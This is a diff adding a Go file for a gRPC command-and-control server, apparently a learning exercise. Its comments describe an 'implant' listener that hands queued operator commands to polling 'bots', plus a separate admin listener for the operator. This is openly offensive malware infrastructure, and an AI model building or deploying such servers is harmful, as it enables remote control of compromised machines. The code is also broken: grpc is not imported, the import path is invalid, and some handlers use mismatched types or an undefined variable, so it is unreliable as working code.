@@ -1,0 +1,114 @@
+package main
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"log"
+	"net"
+
+	"~/scripts/golang/GOre/grpcapi"
+)
+
+// create a struct for handling commands
+type implantServer struct {
+	work, output chan *grpcapi.Command //create a new thread to handle commands, in Golang this is defined by the "chan" type or "channel".
+}
+
+// we need to have a seperate admin struct for handling admin commands, that way we don't run OS commands on the server, only on clients
+type adminServer struct {
+	work, output chan *grpcapi.Command //thread for admin services
+}
+
+// we impliment thse sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
+func NewImplantServer(work, output chan *grpcapi.Command) *implantServer { //returns a pointer to implant server
+	s := new(implantServer) //instantiate a struct of implantServer, name it s
+	s.work = work           //assign work
+	s.output = output       //assign output
+	return s                //return the struct.
+}
+
+// similar to instantiating an inplant server
+func NewAdminServer(work, output chan *grpcapi.Command) *adminServer { //returns a pointer to admin server
+	s := new(adminServer) //instantiate a struct of implantServer, name it s
+	s.work = work         //assign work
+	s.output = output     //assign output
+	return s              //return the struct.
+}
+
+// ctx is part of the built-in golang package "context", it is used for the creation/handling of API calls, without shitting the bed when multiple calls are made at the same time like
+// in a RESTful API. it's a bit more complex, but should pay off in the end. Also, according to Docs for context, it is a bad idea/not allowed to pass in NIL for a context value,
+// nessecitating the need for our own "Empty" message value.
+// define the methods of our structs. Thats what the pointers to structs mean prior to the function definitions. it's OOP baby.
+func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) { //this acts as basically a polling mechanism, asking for work.
+	var cmd = new(grpcapi.Command) //instantiate a new command from the grpcapi.
+	select {                       //switch statement
+	// <- is passing a value from a channel to a reference, similar to dequeing from a queue of jobs for multithreads/goroutines
+	//this is also nonblocking and will run the default case if there is nothing to do.
+	case cmd, ok := <-s.work:
+		if ok { //check if command was successful
+			return cmd, nil
+		}
+		return cmd, errors.New("[-] Channel closed.") //otherwise, return an error that the channel closed
+	default:
+		// if all the above fails, then no work is present
+		return cmd, nil
+	}
+}
+
+// this command will push the command onto the queue or the output channel/goroutine
+func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Empty) (*grpcapi.Command, error) {
+	s.output <- result
+	return &grpcapi.Empty{}, nil
+}
+
+// running of a command for our admin component; we push it to the Goroutine queue and have it be handled by multithreading.
+func (s *adminServer) RunCommand(ctx context.Context, result *grpcapi.Command) (*grpcapi.Command, error) {
+	var res *grpcapi.Command //assign res as a command struct
+	//set up goroutine, doing os in this way is a type of closure, and this goroutine can access cmd from outside this fucntion.
+	go func() {
+		s.work <- cmd
+	}()
+	//assign command output to result, ie telling us if it ran properly.
+	res = <-s.output
+	return res, nil
+}
+
+/*
+the main server loop will run two seperate servers; one for getting requests from the admin clinet (that client being the one that we send our commands to for the server to parse)
+and another server will be the one that communicates to the bots via polling. These servers are only logically different, not physically, so a takedown of the physical server will
+lead to both being flatlined.
+*/
+func main() {
+	//variables for main driver
+	var (
+		implantListener, adminListener net.Listener           //two listeners
+		err                            error                  //errors
+		opts                           []grpcapi.ServerOption //server options
+		work, output                   chan *grpcapi.Command  //work and output goroutines
+	)
+	//create channels for passing input and output commands to implant and admin services
+	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
+	//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
+	implant := NewImplantServer(work, output)
+	admin := NewAdminServer(work, output) //both share the same work and output
+	//open and bind port 5000 on localhost on the server to listen to commands over tcp, check if nil and log a fatal error if so
+	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
+		log.Fatal(err)
+	}
+	//do the same for an admin server, with a differnet port of course
+	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
+		log.Fatal(err)
+	}
+	//the "..." operator implies an input with a variable number of inputs, kinda like explicit function overloading
+	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
+	//register the servers. Do note we never explicitly defined these, protoc did. By compiling our .proto file, it gave us Golang functions for fri.
+	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
+	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+	//use goroutines to serve implants
+	go func() {
+		grpcImplantServer.Serve(implantListener)
+	}()
+	grpcAdminServer.Serve(adminListener)
+
+}
